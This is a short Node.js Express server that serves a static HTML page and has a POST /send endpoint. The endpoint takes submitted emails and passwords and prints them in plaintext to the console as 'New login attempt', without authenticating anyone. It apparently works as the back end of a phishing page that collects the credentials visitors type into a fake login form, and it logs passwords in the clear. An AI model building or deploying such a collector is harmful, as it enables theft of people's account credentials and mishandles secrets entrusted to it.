// server.js
const express = require("express");
const app = express();
const port = 3000;

// Middleware to parse JSON body
app.use(express.json());

// Serve static files (your HTML page)
app.use(express.static("public"));

// Endpoint to receive login data
app.post("/send", (req, res) => {
  const { email, password } = req.body;

  // Log email and password in terminal
  console.log("📩 New login attempt:");
  console.log(`   Email: ${email}`);
  console.log(`   Password: ${password}`);
  console.log("------------------------------------------------");

  res.sendStatus(200); // Respond OK to frontend
});

// Start the server
app.listen(port, () => {
  console.log(`🚀 Server running on http://localhost:${port}`);
});